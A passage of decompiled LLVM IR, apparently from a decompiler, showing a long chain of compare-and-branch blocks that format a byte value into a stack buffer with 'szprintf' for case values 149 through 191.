  %v3_10006654 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006654 = zext i8 %v3_10006654 to i32
  %v4_10006684 = call i32 @szprintf(i32 %v2_10006640, i32 ptrtoint ([13 x i8]* @global_var_10018404.210 to i32), i32 %v4_10006654)
  br label %dec_label_pc_10006688

dec_label_pc_10006688:                            ; preds = %dec_label_pc_10006634, %dec_label_pc_10006640
  %v3_1000668c = icmp eq i32 %v2_10003594, 149
  br i1 %v3_1000668c, label %dec_label_pc_10006694, label %dec_label_pc_100066dc

dec_label_pc_10006694:                            ; preds = %dec_label_pc_10006688
  %v2_10006694 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100066a8 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100066a8 = zext i8 %v3_100066a8 to i32
  %v4_100066d8 = call i32 @szprintf(i32 %v2_10006694, i32 ptrtoint ([13 x i8]* @global_var_10018414.211 to i32), i32 %v4_100066a8)
  br label %dec_label_pc_100066dc

dec_label_pc_100066dc:                            ; preds = %dec_label_pc_10006688, %dec_label_pc_10006694
  %v3_100066e0 = icmp eq i32 %v2_10003594, 150
  br i1 %v3_100066e0, label %dec_label_pc_100066e8, label %dec_label_pc_10006730

dec_label_pc_100066e8:                            ; preds = %dec_label_pc_100066dc
  %v2_100066e8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100066fc = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100066fc = zext i8 %v3_100066fc to i32
  %v4_1000672c = call i32 @szprintf(i32 %v2_100066e8, i32 ptrtoint ([13 x i8]* @global_var_10018424.212 to i32), i32 %v4_100066fc)
  br label %dec_label_pc_10006730

dec_label_pc_10006730:                            ; preds = %dec_label_pc_100066dc, %dec_label_pc_100066e8
  %v3_10006734 = icmp eq i32 %v2_10003594, 151
  br i1 %v3_10006734, label %dec_label_pc_1000673c, label %dec_label_pc_10006784

dec_label_pc_1000673c:                            ; preds = %dec_label_pc_10006730
  %v2_1000673c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006750 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006750 = zext i8 %v3_10006750 to i32
  %v4_10006780 = call i32 @szprintf(i32 %v2_1000673c, i32 ptrtoint ([13 x i8]* @global_var_10018434.213 to i32), i32 %v4_10006750)
  br label %dec_label_pc_10006784

dec_label_pc_10006784:                            ; preds = %dec_label_pc_10006730, %dec_label_pc_1000673c
  %v3_10006788 = icmp eq i32 %v2_10003594, 152
  br i1 %v3_10006788, label %dec_label_pc_10006790, label %dec_label_pc_100067d8

dec_label_pc_10006790:                            ; preds = %dec_label_pc_10006784
  %v2_10006790 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100067a4 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100067a4 = zext i8 %v3_100067a4 to i32
  %v4_100067d4 = call i32 @szprintf(i32 %v2_10006790, i32 ptrtoint ([13 x i8]* @global_var_10018444.214 to i32), i32 %v4_100067a4)
  br label %dec_label_pc_100067d8

dec_label_pc_100067d8:                            ; preds = %dec_label_pc_10006784, %dec_label_pc_10006790
  %v3_100067dc = icmp eq i32 %v2_10003594, 153
  br i1 %v3_100067dc, label %dec_label_pc_100067e4, label %dec_label_pc_1000682c

dec_label_pc_100067e4:                            ; preds = %dec_label_pc_100067d8
  %v2_100067e4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100067f8 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100067f8 = zext i8 %v3_100067f8 to i32
  %v4_10006828 = call i32 @szprintf(i32 %v2_100067e4, i32 ptrtoint ([13 x i8]* @global_var_10018454.215 to i32), i32 %v4_100067f8)
  br label %dec_label_pc_1000682c

dec_label_pc_1000682c:                            ; preds = %dec_label_pc_100067d8, %dec_label_pc_100067e4
  %v3_10006830 = icmp eq i32 %v2_10003594, 154
  br i1 %v3_10006830, label %dec_label_pc_10006838, label %dec_label_pc_10006880

dec_label_pc_10006838:                            ; preds = %dec_label_pc_1000682c
  %v2_10006838 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000684c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_1000684c = zext i8 %v3_1000684c to i32
  %v4_1000687c = call i32 @szprintf(i32 %v2_10006838, i32 ptrtoint ([13 x i8]* @global_var_10018464.216 to i32), i32 %v4_1000684c)
  br label %dec_label_pc_10006880

dec_label_pc_10006880:                            ; preds = %dec_label_pc_1000682c, %dec_label_pc_10006838
  %v3_10006884 = icmp eq i32 %v2_10003594, 155
  br i1 %v3_10006884, label %dec_label_pc_1000688c, label %dec_label_pc_100068d4

dec_label_pc_1000688c:                            ; preds = %dec_label_pc_10006880
  %v2_1000688c = ptrtoint i32* %stack_var_-52 to i32
  %v3_100068a0 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100068a0 = zext i8 %v3_100068a0 to i32
  %v4_100068d0 = call i32 @szprintf(i32 %v2_1000688c, i32 ptrtoint ([13 x i8]* @global_var_10018474.217 to i32), i32 %v4_100068a0)
  br label %dec_label_pc_100068d4

dec_label_pc_100068d4:                            ; preds = %dec_label_pc_10006880, %dec_label_pc_1000688c
  %v3_100068d8 = icmp eq i32 %v2_10003594, 156
  br i1 %v3_100068d8, label %dec_label_pc_100068e0, label %dec_label_pc_10006928

dec_label_pc_100068e0:                            ; preds = %dec_label_pc_100068d4
  %v2_100068e0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100068f4 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100068f4 = zext i8 %v3_100068f4 to i32
  %v4_10006924 = call i32 @szprintf(i32 %v2_100068e0, i32 ptrtoint ([13 x i8]* @global_var_10018484.218 to i32), i32 %v4_100068f4)
  br label %dec_label_pc_10006928

dec_label_pc_10006928:                            ; preds = %dec_label_pc_100068d4, %dec_label_pc_100068e0
  %v3_1000692c = icmp eq i32 %v2_10003594, 157
  br i1 %v3_1000692c, label %dec_label_pc_10006934, label %dec_label_pc_1000697c

dec_label_pc_10006934:                            ; preds = %dec_label_pc_10006928
  %v2_10006934 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006948 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006948 = zext i8 %v3_10006948 to i32
  %v4_10006978 = call i32 @szprintf(i32 %v2_10006934, i32 ptrtoint ([13 x i8]* @global_var_10018494.219 to i32), i32 %v4_10006948)
  br label %dec_label_pc_1000697c

dec_label_pc_1000697c:                            ; preds = %dec_label_pc_10006928, %dec_label_pc_10006934
  %v3_10006980 = icmp eq i32 %v2_10003594, 158
  br i1 %v3_10006980, label %dec_label_pc_10006988, label %dec_label_pc_100069d0

dec_label_pc_10006988:                            ; preds = %dec_label_pc_1000697c
  %v2_10006988 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000699c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_1000699c = zext i8 %v3_1000699c to i32
  %v4_100069cc = call i32 @szprintf(i32 %v2_10006988, i32 ptrtoint ([13 x i8]* @global_var_100184a4.220 to i32), i32 %v4_1000699c)
  br label %dec_label_pc_100069d0

dec_label_pc_100069d0:                            ; preds = %dec_label_pc_1000697c, %dec_label_pc_10006988
  %v3_100069d4 = icmp eq i32 %v2_10003594, 159
  br i1 %v3_100069d4, label %dec_label_pc_100069dc, label %dec_label_pc_10006a24

dec_label_pc_100069dc:                            ; preds = %dec_label_pc_100069d0
  %v2_100069dc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100069f0 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100069f0 = zext i8 %v3_100069f0 to i32
  %v4_10006a20 = call i32 @szprintf(i32 %v2_100069dc, i32 ptrtoint ([13 x i8]* @global_var_100184b4.221 to i32), i32 %v4_100069f0)
  br label %dec_label_pc_10006a24

dec_label_pc_10006a24:                            ; preds = %dec_label_pc_100069d0, %dec_label_pc_100069dc
  %v3_10006a28 = icmp eq i32 %v2_10003594, 160
  br i1 %v3_10006a28, label %dec_label_pc_10006a30, label %dec_label_pc_10006a78

dec_label_pc_10006a30:                            ; preds = %dec_label_pc_10006a24
  %v2_10006a30 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006a44 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006a44 = zext i8 %v3_10006a44 to i32
  %v4_10006a74 = call i32 @szprintf(i32 %v2_10006a30, i32 ptrtoint ([13 x i8]* @global_var_100184c4.222 to i32), i32 %v4_10006a44)
  br label %dec_label_pc_10006a78

dec_label_pc_10006a78:                            ; preds = %dec_label_pc_10006a24, %dec_label_pc_10006a30
  %v3_10006a7c = icmp eq i32 %v2_10003594, 161
  br i1 %v3_10006a7c, label %dec_label_pc_10006a84, label %dec_label_pc_10006acc

dec_label_pc_10006a84:                            ; preds = %dec_label_pc_10006a78
  %v2_10006a84 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006a98 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006a98 = zext i8 %v3_10006a98 to i32
  %v4_10006ac8 = call i32 @szprintf(i32 %v2_10006a84, i32 ptrtoint ([12 x i8]* @global_var_100184d4.223 to i32), i32 %v4_10006a98)
  br label %dec_label_pc_10006acc

dec_label_pc_10006acc:                            ; preds = %dec_label_pc_10006a78, %dec_label_pc_10006a84
  %v3_10006ad0 = icmp eq i32 %v2_10003594, 162
  br i1 %v3_10006ad0, label %dec_label_pc_10006ad8, label %dec_label_pc_10006b20

dec_label_pc_10006ad8:                            ; preds = %dec_label_pc_10006acc
  %v2_10006ad8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006aec = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006aec = zext i8 %v3_10006aec to i32
  %v4_10006b1c = call i32 @szprintf(i32 %v2_10006ad8, i32 ptrtoint ([13 x i8]* @global_var_100184e0.224 to i32), i32 %v4_10006aec)
  br label %dec_label_pc_10006b20

dec_label_pc_10006b20:                            ; preds = %dec_label_pc_10006acc, %dec_label_pc_10006ad8
  %v3_10006b24 = icmp eq i32 %v2_10003594, 163
  br i1 %v3_10006b24, label %dec_label_pc_10006b2c, label %dec_label_pc_10006b74

dec_label_pc_10006b2c:                            ; preds = %dec_label_pc_10006b20
  %v2_10006b2c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006b40 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006b40 = zext i8 %v3_10006b40 to i32
  %v4_10006b70 = call i32 @szprintf(i32 %v2_10006b2c, i32 ptrtoint ([13 x i8]* @global_var_100184f0.225 to i32), i32 %v4_10006b40)
  br label %dec_label_pc_10006b74

dec_label_pc_10006b74:                            ; preds = %dec_label_pc_10006b20, %dec_label_pc_10006b2c
  %v3_10006b78 = icmp eq i32 %v2_10003594, 164
  br i1 %v3_10006b78, label %dec_label_pc_10006b80, label %dec_label_pc_10006bc8

dec_label_pc_10006b80:                            ; preds = %dec_label_pc_10006b74
  %v2_10006b80 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006b94 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006b94 = zext i8 %v3_10006b94 to i32
  %v4_10006bc4 = call i32 @szprintf(i32 %v2_10006b80, i32 ptrtoint ([13 x i8]* @global_var_10018500.226 to i32), i32 %v4_10006b94)
  br label %dec_label_pc_10006bc8

dec_label_pc_10006bc8:                            ; preds = %dec_label_pc_10006b74, %dec_label_pc_10006b80
  %v3_10006bcc = icmp eq i32 %v2_10003594, 165
  br i1 %v3_10006bcc, label %dec_label_pc_10006bd4, label %dec_label_pc_10006c1c

dec_label_pc_10006bd4:                            ; preds = %dec_label_pc_10006bc8
  %v2_10006bd4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006be8 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006be8 = zext i8 %v3_10006be8 to i32
  %v4_10006c18 = call i32 @szprintf(i32 %v2_10006bd4, i32 ptrtoint ([12 x i8]* @global_var_10018510.227 to i32), i32 %v4_10006be8)
  br label %dec_label_pc_10006c1c

dec_label_pc_10006c1c:                            ; preds = %dec_label_pc_10006bc8, %dec_label_pc_10006bd4
  %v3_10006c20 = icmp eq i32 %v2_10003594, 166
  br i1 %v3_10006c20, label %dec_label_pc_10006c28, label %dec_label_pc_10006c70

dec_label_pc_10006c28:                            ; preds = %dec_label_pc_10006c1c
  %v2_10006c28 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006c3c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006c3c = zext i8 %v3_10006c3c to i32
  %v4_10006c6c = call i32 @szprintf(i32 %v2_10006c28, i32 ptrtoint ([13 x i8]* @global_var_1001851c.228 to i32), i32 %v4_10006c3c)
  br label %dec_label_pc_10006c70

dec_label_pc_10006c70:                            ; preds = %dec_label_pc_10006c1c, %dec_label_pc_10006c28
  %v3_10006c74 = icmp eq i32 %v2_10003594, 167
  br i1 %v3_10006c74, label %dec_label_pc_10006c7c, label %dec_label_pc_10006cc4

dec_label_pc_10006c7c:                            ; preds = %dec_label_pc_10006c70
  %v2_10006c7c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006c90 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006c90 = zext i8 %v3_10006c90 to i32
  %v4_10006cc0 = call i32 @szprintf(i32 %v2_10006c7c, i32 ptrtoint ([14 x i8]* @global_var_1001852c.229 to i32), i32 %v4_10006c90)
  br label %dec_label_pc_10006cc4

dec_label_pc_10006cc4:                            ; preds = %dec_label_pc_10006c70, %dec_label_pc_10006c7c
  %v3_10006cc8 = icmp eq i32 %v2_10003594, 168
  br i1 %v3_10006cc8, label %dec_label_pc_10006cd0, label %dec_label_pc_10006d18

dec_label_pc_10006cd0:                            ; preds = %dec_label_pc_10006cc4
  %v2_10006cd0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006ce4 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006ce4 = zext i8 %v3_10006ce4 to i32
  %v4_10006d14 = call i32 @szprintf(i32 %v2_10006cd0, i32 ptrtoint ([14 x i8]* @global_var_1001853c.230 to i32), i32 %v4_10006ce4)
  br label %dec_label_pc_10006d18

dec_label_pc_10006d18:                            ; preds = %dec_label_pc_10006cc4, %dec_label_pc_10006cd0
  %v3_10006d1c = icmp eq i32 %v2_10003594, 169
  br i1 %v3_10006d1c, label %dec_label_pc_10006d24, label %dec_label_pc_10006d6c

dec_label_pc_10006d24:                            ; preds = %dec_label_pc_10006d18
  %v2_10006d24 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006d38 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006d38 = zext i8 %v3_10006d38 to i32
  %v4_10006d68 = call i32 @szprintf(i32 %v2_10006d24, i32 ptrtoint ([13 x i8]* @global_var_1001854c.231 to i32), i32 %v4_10006d38)
  br label %dec_label_pc_10006d6c

dec_label_pc_10006d6c:                            ; preds = %dec_label_pc_10006d18, %dec_label_pc_10006d24
  %v3_10006d70 = icmp eq i32 %v2_10003594, 170
  br i1 %v3_10006d70, label %dec_label_pc_10006d78, label %dec_label_pc_10006dc0

dec_label_pc_10006d78:                            ; preds = %dec_label_pc_10006d6c
  %v2_10006d78 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006d8c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006d8c = zext i8 %v3_10006d8c to i32
  %v4_10006dbc = call i32 @szprintf(i32 %v2_10006d78, i32 ptrtoint ([14 x i8]* @global_var_1001855c.232 to i32), i32 %v4_10006d8c)
  br label %dec_label_pc_10006dc0

dec_label_pc_10006dc0:                            ; preds = %dec_label_pc_10006d6c, %dec_label_pc_10006d78
  %v3_10006dc4 = icmp eq i32 %v2_10003594, 171
  br i1 %v3_10006dc4, label %dec_label_pc_10006dcc, label %dec_label_pc_10006e14

dec_label_pc_10006dcc:                            ; preds = %dec_label_pc_10006dc0
  %v2_10006dcc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006de0 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006de0 = zext i8 %v3_10006de0 to i32
  %v4_10006e10 = call i32 @szprintf(i32 %v2_10006dcc, i32 ptrtoint ([14 x i8]* @global_var_1001856c.233 to i32), i32 %v4_10006de0)
  br label %dec_label_pc_10006e14

dec_label_pc_10006e14:                            ; preds = %dec_label_pc_10006dc0, %dec_label_pc_10006dcc
  %v3_10006e18 = icmp eq i32 %v2_10003594, 172
  br i1 %v3_10006e18, label %dec_label_pc_10006e20, label %dec_label_pc_10006e68

dec_label_pc_10006e20:                            ; preds = %dec_label_pc_10006e14
  %v2_10006e20 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006e34 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006e34 = zext i8 %v3_10006e34 to i32
  %v4_10006e64 = call i32 @szprintf(i32 %v2_10006e20, i32 ptrtoint ([13 x i8]* @global_var_1001857c.234 to i32), i32 %v4_10006e34)
  br label %dec_label_pc_10006e68

dec_label_pc_10006e68:                            ; preds = %dec_label_pc_10006e14, %dec_label_pc_10006e20
  %v3_10006e6c = icmp eq i32 %v2_10003594, 173
  br i1 %v3_10006e6c, label %dec_label_pc_10006e74, label %dec_label_pc_10006ebc

dec_label_pc_10006e74:                            ; preds = %dec_label_pc_10006e68
  %v2_10006e74 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006e88 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006e88 = zext i8 %v3_10006e88 to i32
  %v4_10006eb8 = call i32 @szprintf(i32 %v2_10006e74, i32 ptrtoint ([14 x i8]* @global_var_1001858c.235 to i32), i32 %v4_10006e88)
  br label %dec_label_pc_10006ebc

dec_label_pc_10006ebc:                            ; preds = %dec_label_pc_10006e68, %dec_label_pc_10006e74
  %v3_10006ec0 = icmp eq i32 %v2_10003594, 174
  br i1 %v3_10006ec0, label %dec_label_pc_10006ec8, label %dec_label_pc_10006f10

dec_label_pc_10006ec8:                            ; preds = %dec_label_pc_10006ebc
  %v2_10006ec8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006edc = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006edc = zext i8 %v3_10006edc to i32
  %v4_10006f0c = call i32 @szprintf(i32 %v2_10006ec8, i32 ptrtoint ([13 x i8]* @global_var_1001859c.236 to i32), i32 %v4_10006edc)
  br label %dec_label_pc_10006f10

dec_label_pc_10006f10:                            ; preds = %dec_label_pc_10006ebc, %dec_label_pc_10006ec8
  %v3_10006f14 = icmp eq i32 %v2_10003594, 175
  br i1 %v3_10006f14, label %dec_label_pc_10006f1c, label %dec_label_pc_10006f64

dec_label_pc_10006f1c:                            ; preds = %dec_label_pc_10006f10
  %v2_10006f1c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006f30 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006f30 = zext i8 %v3_10006f30 to i32
  %v4_10006f60 = call i32 @szprintf(i32 %v2_10006f1c, i32 ptrtoint ([14 x i8]* @global_var_100185ac.237 to i32), i32 %v4_10006f30)
  br label %dec_label_pc_10006f64

dec_label_pc_10006f64:                            ; preds = %dec_label_pc_10006f10, %dec_label_pc_10006f1c
  %v3_10006f68 = icmp eq i32 %v2_10003594, 176
  br i1 %v3_10006f68, label %dec_label_pc_10006f70, label %dec_label_pc_10006fb8

dec_label_pc_10006f70:                            ; preds = %dec_label_pc_10006f64
  %v2_10006f70 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006f84 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006f84 = zext i8 %v3_10006f84 to i32
  %v4_10006fb4 = call i32 @szprintf(i32 %v2_10006f70, i32 ptrtoint ([14 x i8]* @global_var_100185bc.238 to i32), i32 %v4_10006f84)
  br label %dec_label_pc_10006fb8

dec_label_pc_10006fb8:                            ; preds = %dec_label_pc_10006f64, %dec_label_pc_10006f70
  %v3_10006fbc = icmp eq i32 %v2_10003594, 177
  br i1 %v3_10006fbc, label %dec_label_pc_10006fc4, label %dec_label_pc_1000700c

dec_label_pc_10006fc4:                            ; preds = %dec_label_pc_10006fb8
  %v2_10006fc4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006fd8 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10006fd8 = zext i8 %v3_10006fd8 to i32
  %v4_10007008 = call i32 @szprintf(i32 %v2_10006fc4, i32 ptrtoint ([14 x i8]* @global_var_100185cc.239 to i32), i32 %v4_10006fd8)
  br label %dec_label_pc_1000700c

dec_label_pc_1000700c:                            ; preds = %dec_label_pc_10006fb8, %dec_label_pc_10006fc4
  %v3_10007010 = icmp eq i32 %v2_10003594, 178
  br i1 %v3_10007010, label %dec_label_pc_10007018, label %dec_label_pc_10007060

dec_label_pc_10007018:                            ; preds = %dec_label_pc_1000700c
  %v2_10007018 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000702c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_1000702c = zext i8 %v3_1000702c to i32
  %v4_1000705c = call i32 @szprintf(i32 %v2_10007018, i32 ptrtoint ([14 x i8]* @global_var_100185dc.240 to i32), i32 %v4_1000702c)
  br label %dec_label_pc_10007060

dec_label_pc_10007060:                            ; preds = %dec_label_pc_1000700c, %dec_label_pc_10007018
  %v3_10007064 = icmp eq i32 %v2_10003594, 179
  br i1 %v3_10007064, label %dec_label_pc_1000706c, label %dec_label_pc_100070b4

dec_label_pc_1000706c:                            ; preds = %dec_label_pc_10007060
  %v2_1000706c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007080 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10007080 = zext i8 %v3_10007080 to i32
  %v4_100070b0 = call i32 @szprintf(i32 %v2_1000706c, i32 ptrtoint ([14 x i8]* @global_var_1001852c.229 to i32), i32 %v4_10007080)
  br label %dec_label_pc_100070b4

dec_label_pc_100070b4:                            ; preds = %dec_label_pc_10007060, %dec_label_pc_1000706c
  %v3_100070b8 = icmp eq i32 %v2_10003594, 180
  br i1 %v3_100070b8, label %dec_label_pc_100070c0, label %dec_label_pc_10007108

dec_label_pc_100070c0:                            ; preds = %dec_label_pc_100070b4
  %v2_100070c0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100070d4 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100070d4 = zext i8 %v3_100070d4 to i32
  %v4_10007104 = call i32 @szprintf(i32 %v2_100070c0, i32 ptrtoint ([13 x i8]* @global_var_100185ec.241 to i32), i32 %v4_100070d4)
  br label %dec_label_pc_10007108

dec_label_pc_10007108:                            ; preds = %dec_label_pc_100070b4, %dec_label_pc_100070c0
  %v3_1000710c = icmp eq i32 %v2_10003594, 181
  br i1 %v3_1000710c, label %dec_label_pc_10007114, label %dec_label_pc_1000715c

dec_label_pc_10007114:                            ; preds = %dec_label_pc_10007108
  %v2_10007114 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007128 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10007128 = zext i8 %v3_10007128 to i32
  %v4_10007158 = call i32 @szprintf(i32 %v2_10007114, i32 ptrtoint ([12 x i8]* @global_var_100185fc.242 to i32), i32 %v4_10007128)
  br label %dec_label_pc_1000715c

dec_label_pc_1000715c:                            ; preds = %dec_label_pc_10007108, %dec_label_pc_10007114
  %v3_10007160 = icmp eq i32 %v2_10003594, 182
  br i1 %v3_10007160, label %dec_label_pc_10007168, label %dec_label_pc_100071b0

dec_label_pc_10007168:                            ; preds = %dec_label_pc_1000715c
  %v2_10007168 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000717c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_1000717c = zext i8 %v3_1000717c to i32
  %v4_100071ac = call i32 @szprintf(i32 %v2_10007168, i32 ptrtoint ([14 x i8]* @global_var_10018608.243 to i32), i32 %v4_1000717c)
  br label %dec_label_pc_100071b0

dec_label_pc_100071b0:                            ; preds = %dec_label_pc_1000715c, %dec_label_pc_10007168
  %v3_100071b4 = icmp eq i32 %v2_10003594, 183
  br i1 %v3_100071b4, label %dec_label_pc_100071bc, label %dec_label_pc_10007204

dec_label_pc_100071bc:                            ; preds = %dec_label_pc_100071b0
  %v2_100071bc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100071d0 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100071d0 = zext i8 %v3_100071d0 to i32
  %v4_10007200 = call i32 @szprintf(i32 %v2_100071bc, i32 ptrtoint ([14 x i8]* @global_var_10018618.244 to i32), i32 %v4_100071d0)
  br label %dec_label_pc_10007204

dec_label_pc_10007204:                            ; preds = %dec_label_pc_100071b0, %dec_label_pc_100071bc
  %v3_10007208 = icmp eq i32 %v2_10003594, 184
  br i1 %v3_10007208, label %dec_label_pc_10007210, label %dec_label_pc_10007258

dec_label_pc_10007210:                            ; preds = %dec_label_pc_10007204
  %v2_10007210 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007224 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10007224 = zext i8 %v3_10007224 to i32
  %v4_10007254 = call i32 @szprintf(i32 %v2_10007210, i32 ptrtoint ([14 x i8]* @global_var_10018628.245 to i32), i32 %v4_10007224)
  br label %dec_label_pc_10007258

dec_label_pc_10007258:                            ; preds = %dec_label_pc_10007204, %dec_label_pc_10007210
  %v3_1000725c = icmp eq i32 %v2_10003594, 185
  br i1 %v3_1000725c, label %dec_label_pc_10007264, label %dec_label_pc_100072ac

dec_label_pc_10007264:                            ; preds = %dec_label_pc_10007258
  %v2_10007264 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007278 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10007278 = zext i8 %v3_10007278 to i32
  %v4_100072a8 = call i32 @szprintf(i32 %v2_10007264, i32 ptrtoint ([14 x i8]* @global_var_10018638.246 to i32), i32 %v4_10007278)
  br label %dec_label_pc_100072ac

dec_label_pc_100072ac:                            ; preds = %dec_label_pc_10007258, %dec_label_pc_10007264
  %v3_100072b0 = icmp eq i32 %v2_10003594, 186
  br i1 %v3_100072b0, label %dec_label_pc_100072b8, label %dec_label_pc_10007300

dec_label_pc_100072b8:                            ; preds = %dec_label_pc_100072ac
  %v2_100072b8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100072cc = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100072cc = zext i8 %v3_100072cc to i32
  %v4_100072fc = call i32 @szprintf(i32 %v2_100072b8, i32 ptrtoint ([14 x i8]* @global_var_10018648.247 to i32), i32 %v4_100072cc)
  br label %dec_label_pc_10007300

dec_label_pc_10007300:                            ; preds = %dec_label_pc_100072ac, %dec_label_pc_100072b8
  %v3_10007304 = icmp eq i32 %v2_10003594, 187
  br i1 %v3_10007304, label %dec_label_pc_1000730c, label %dec_label_pc_10007354

dec_label_pc_1000730c:                            ; preds = %dec_label_pc_10007300
  %v2_1000730c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007320 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10007320 = zext i8 %v3_10007320 to i32
  %v4_10007350 = call i32 @szprintf(i32 %v2_1000730c, i32 ptrtoint ([14 x i8]* @global_var_10018658.248 to i32), i32 %v4_10007320)
  br label %dec_label_pc_10007354

dec_label_pc_10007354:                            ; preds = %dec_label_pc_10007300, %dec_label_pc_1000730c
  %v3_10007358 = icmp eq i32 %v2_10003594, 188
  br i1 %v3_10007358, label %dec_label_pc_10007360, label %dec_label_pc_100073a8

dec_label_pc_10007360:                            ; preds = %dec_label_pc_10007354
  %v2_10007360 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007374 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10007374 = zext i8 %v3_10007374 to i32
  %v4_100073a4 = call i32 @szprintf(i32 %v2_10007360, i32 ptrtoint ([14 x i8]* @global_var_10018668.249 to i32), i32 %v4_10007374)
  br label %dec_label_pc_100073a8

dec_label_pc_100073a8:                            ; preds = %dec_label_pc_10007354, %dec_label_pc_10007360
  %v3_100073ac = icmp eq i32 %v2_10003594, 189
  br i1 %v3_100073ac, label %dec_label_pc_100073b4, label %dec_label_pc_100073fc

dec_label_pc_100073b4:                            ; preds = %dec_label_pc_100073a8
  %v2_100073b4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100073c8 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100073c8 = zext i8 %v3_100073c8 to i32
  %v4_100073f8 = call i32 @szprintf(i32 %v2_100073b4, i32 ptrtoint ([14 x i8]* @global_var_10018678.250 to i32), i32 %v4_100073c8)
  br label %dec_label_pc_100073fc

dec_label_pc_100073fc:                            ; preds = %dec_label_pc_100073a8, %dec_label_pc_100073b4
  %v3_10007400 = icmp eq i32 %v2_10003594, 190
  br i1 %v3_10007400, label %dec_label_pc_10007408, label %dec_label_pc_10007450

dec_label_pc_10007408:                            ; preds = %dec_label_pc_100073fc
  %v2_10007408 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000741c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_1000741c = zext i8 %v3_1000741c to i32
  %v4_1000744c = call i32 @szprintf(i32 %v2_10007408, i32 ptrtoint ([14 x i8]* @global_var_10018688.251 to i32), i32 %v4_1000741c)
  br label %dec_label_pc_10007450

dec_label_pc_10007450:                            ; preds = %dec_label_pc_100073fc, %dec_label_pc_10007408
  %v3_10007454 = icmp eq i32 %v2_10003594, 191
  br i1 %v3_10007454, label %dec_label_pc_1000745c, label %dec_label_pc_100074a4

dec_label_pc_1000745c:                            ; preds = %dec_label_pc_10007450
  %v2_1000745c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007470 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10007470 = zext i8 %v3_10007470 to i32
  %v4_100074a0 = call i32 @szprintf(i32 %v2_1000745c, i32 ptrtoint ([14 x i8]* @global_var_10018698.252 to i32), i32 %v4_10007470)
